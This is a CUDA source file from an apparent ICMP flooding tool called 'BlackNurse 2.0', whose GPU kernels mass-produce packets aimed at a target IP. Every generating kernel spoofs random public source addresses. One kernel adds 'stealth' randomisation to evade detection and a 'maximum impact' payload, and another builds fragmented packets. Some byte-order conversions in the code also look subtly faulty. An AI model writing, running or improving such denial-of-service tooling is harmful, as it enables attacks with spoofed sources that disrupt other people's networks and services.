/**
 * BlackNurse 2.0 - CUDA Kernels
 * 
 * GPU kernels for high-performance packet generation and processing
 */

#ifdef CUDA_ENABLED

#include <cuda_runtime.h>
#include <device_launch_parameters.h>
#include <curand_kernel.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

namespace blacknurse {

/**
 * Device function to calculate IP checksum
 */
__device__ uint16_t calculate_ip_checksum_device(struct iphdr* ip_header) {
    uint32_t sum = 0;
    uint16_t* ptr = reinterpret_cast<uint16_t*>(ip_header);
    
    // Clear checksum field
    ip_header->check = 0;
    
    // Sum all 16-bit words in IP header
    for (int i = 0; i < 10; ++i) {
        sum += __byte_perm(ptr[i], 0, 0x0123); // Convert to host byte order
    }
    
    // Fold 32-bit sum to 16 bits
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    return __byte_perm(~sum, 0, 0x0123); // Convert back to network byte order
}

/**
 * Device function to calculate ICMP checksum
 */
__device__ uint16_t calculate_icmp_checksum_device(struct icmphdr* icmp_header, size_t size) {
    uint32_t sum = 0;
    uint16_t* ptr = reinterpret_cast<uint16_t*>(icmp_header);
    
    // Clear checksum field
    icmp_header->checksum = 0;
    
    // Sum all 16-bit words
    for (size_t i = 0; i < size / 2; ++i) {
        sum += __byte_perm(ptr[i], 0, 0x0123);
    }
    
    // Add odd byte if present
    if (size % 2) {
        sum += (reinterpret_cast<uint8_t*>(icmp_header)[size - 1]) << 8;
    }
    
    // Fold 32-bit sum to 16 bits
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    return __byte_perm(~sum, 0, 0x0123);
}

/**
 * Device function to generate random IP address
 */
__device__ uint32_t generate_random_ip_device(curandState* state) {
    uint32_t ip;
    do {
        ip = curand(state);
        uint8_t first_octet = (ip >> 24) & 0xFF;
        
        // Avoid reserved ranges
        if (first_octet != 10 && first_octet != 127 && 
            !(first_octet == 172 && ((ip >> 16) & 0xF0) == 0x10) &&
            !(first_octet == 192 && ((ip >> 16) & 0xFF) == 0xA8) &&
            first_octet != 0 && first_octet != 255) {
            break;
        }
    } while (true);
    
    return ip;
}

/**
 * CUDA kernel for generating packets in parallel
 */
__global__ void generate_packets_kernel(uint8_t* packets, size_t batch_size, size_t packet_size,
                                       uint32_t target_ip, uint8_t icmp_type, uint8_t icmp_code,
                                       size_t payload_size) {
    
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    if (idx >= batch_size) return;
    
    // Initialize random state
    curandState state;
    curand_init(clock64() + idx, idx, 0, &state);
    
    // Calculate packet offset
    uint8_t* packet_data = packets + idx * packet_size;
    
    // Fill IP header
    struct iphdr* ip_header = reinterpret_cast<struct iphdr*>(packet_data);
    memset(ip_header, 0, sizeof(struct iphdr));
    
    ip_header->version = 4;
    ip_header->ihl = 5;
    ip_header->tos = 0;
    ip_header->tot_len = __byte_perm(packet_size, 0, 0x0123); // Convert to network byte order
    ip_header->id = __byte_perm(curand(&state) & 0xFFFF, 0, 0x0123);
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_ICMP;
    ip_header->saddr = generate_random_ip_device(&state);
    ip_header->daddr = target_ip;
    
    // Fill ICMP header
    struct icmphdr* icmp_header = reinterpret_cast<struct icmphdr*>(packet_data + sizeof(struct iphdr));
    memset(icmp_header, 0, sizeof(struct icmphdr));
    
    icmp_header->type = icmp_type;
    icmp_header->code = icmp_code;
    icmp_header->un.echo.id = __byte_perm(curand(&state) & 0xFFFF, 0, 0x0123);
    icmp_header->un.echo.sequence = __byte_perm(idx & 0xFFFF, 0, 0x0123);
    
    // Fill payload with pattern
    if (payload_size > 0) {
        uint8_t* payload = packet_data + sizeof(struct iphdr) + sizeof(struct icmphdr);
        const uint8_t pattern[] = {0x08, 0xEF, 0xC1, 0x00};
        
        for (size_t i = 0; i < payload_size; ++i) {
            payload[i] = pattern[i % 4];
        }
    }
    
    // Calculate checksums
    size_t icmp_size = sizeof(struct icmphdr) + payload_size;
    icmp_header->checksum = calculate_icmp_checksum_device(icmp_header, icmp_size);
    ip_header->check = calculate_ip_checksum_device(ip_header);
}

/**
 * CUDA kernel for calculating checksums in parallel
 */
__global__ void calculate_checksums_kernel(uint8_t* packets, size_t batch_size, size_t packet_size) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    if (idx >= batch_size) return;
    
    uint8_t* packet_data = packets + idx * packet_size;
    
    struct iphdr* ip_header = reinterpret_cast<struct iphdr*>(packet_data);
    struct icmphdr* icmp_header = reinterpret_cast<struct icmphdr*>(packet_data + sizeof(struct iphdr));
    
    // Calculate ICMP checksum
    size_t icmp_size = packet_size - sizeof(struct iphdr);
    icmp_header->checksum = calculate_icmp_checksum_device(icmp_header, icmp_size);
    
    // Calculate IP checksum
    ip_header->check = calculate_ip_checksum_device(ip_header);
}

/**
 * Enhanced packet generation kernel with stealth features
 */
__global__ void generate_stealth_packets_kernel(uint8_t* packets, size_t batch_size, size_t packet_size,
                                               uint32_t target_ip, uint8_t icmp_type, uint8_t icmp_code,
                                               size_t payload_size, bool randomize_payload) {
    
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    if (idx >= batch_size) return;
    
    // Initialize random state with better entropy
    curandState state;
    curand_init(clock64() + idx * 1337 + blockIdx.x, idx, 0, &state);
    
    uint8_t* packet_data = packets + idx * packet_size;
    
    // Fill IP header with stealth features
    struct iphdr* ip_header = reinterpret_cast<struct iphdr*>(packet_data);
    memset(ip_header, 0, sizeof(struct iphdr));
    
    ip_header->version = 4;
    ip_header->ihl = 5;
    ip_header->tos = curand(&state) & 0xFF; // Random ToS for stealth
    ip_header->tot_len = __byte_perm(packet_size, 0, 0x0123);
    ip_header->id = __byte_perm(curand(&state) & 0xFFFF, 0, 0x0123);
    ip_header->frag_off = 0;
    
    // Random TTL between 32-128 for stealth
    ip_header->ttl = 32 + (curand(&state) % 97);
    ip_header->protocol = IPPROTO_ICMP;
    ip_header->saddr = generate_random_ip_device(&state);
    ip_header->daddr = target_ip;
    
    // Fill ICMP header
    struct icmphdr* icmp_header = reinterpret_cast<struct icmphdr*>(packet_data + sizeof(struct iphdr));
    memset(icmp_header, 0, sizeof(struct icmphdr));
    
    icmp_header->type = icmp_type;
    icmp_header->code = icmp_code;
    icmp_header->un.echo.id = __byte_perm(curand(&state) & 0xFFFF, 0, 0x0123);
    icmp_header->un.echo.sequence = __byte_perm(curand(&state) & 0xFFFF, 0, 0x0123);
    
    // Fill payload
    if (payload_size > 0) {
        uint8_t* payload = packet_data + sizeof(struct iphdr) + sizeof(struct icmphdr);
        
        if (randomize_payload) {
            // Random payload for maximum stealth
            for (size_t i = 0; i < payload_size; ++i) {
                payload[i] = curand(&state) & 0xFF;
            }
        } else {
            // Pattern payload for maximum impact
            const uint8_t pattern[] = {0x08, 0xEF, 0xC1, 0x00};
            for (size_t i = 0; i < payload_size; ++i) {
                payload[i] = pattern[i % 4];
            }
        }
    }
    
    // Calculate checksums
    size_t icmp_size = sizeof(struct icmphdr) + payload_size;
    icmp_header->checksum = calculate_icmp_checksum_device(icmp_header, icmp_size);
    ip_header->check = calculate_ip_checksum_device(ip_header);
}

/**
 * Fragmented packet generation kernel
 */
__global__ void generate_fragmented_packets_kernel(uint8_t* packets, size_t batch_size, size_t packet_size,
                                                  uint32_t target_ip, uint8_t icmp_type, uint8_t icmp_code,
                                                  size_t payload_size, size_t fragment_size) {
    
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    if (idx >= batch_size) return;
    
    curandState state;
    curand_init(clock64() + idx, idx, 0, &state);
    
    uint8_t* packet_data = packets + idx * packet_size;
    
    // Calculate fragment offset
    size_t total_payload = sizeof(struct icmphdr) + payload_size;
    size_t fragment_offset = (idx % ((total_payload + fragment_size - 1) / fragment_size)) * fragment_size;
    size_t current_fragment_size = min(fragment_size, total_payload - fragment_offset);
    
    // Fill IP header for fragment
    struct iphdr* ip_header = reinterpret_cast<struct iphdr*>(packet_data);
    memset(ip_header, 0, sizeof(struct iphdr));
    
    ip_header->version = 4;
    ip_header->ihl = 5;
    ip_header->tos = 0;
    ip_header->tot_len = __byte_perm(sizeof(struct iphdr) + current_fragment_size, 0, 0x0123);
    ip_header->id = __byte_perm(curand(&state) & 0xFFFF, 0, 0x0123);
    
    // Set fragment flags and offset
    uint16_t flags_and_offset = fragment_offset / 8;
    if (fragment_offset + fragment_size < total_payload) {
        flags_and_offset |= 0x2000; // More fragments flag
    }
    ip_header->frag_off = __byte_perm(flags_and_offset, 0, 0x0123);
    
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_ICMP;
    ip_header->saddr = generate_random_ip_device(&state);
    ip_header->daddr = target_ip;
    
    // Fill fragment data (simplified for demonstration)
    uint8_t* fragment_data = packet_data + sizeof(struct iphdr);
    for (size_t i = 0; i < current_fragment_size; ++i) {
        fragment_data[i] = (fragment_offset + i) & 0xFF;
    }
    
    // Calculate IP checksum
    ip_header->check = calculate_ip_checksum_device(ip_header);
}

} // namespace blacknurse

#endif // CUDA_ENABLED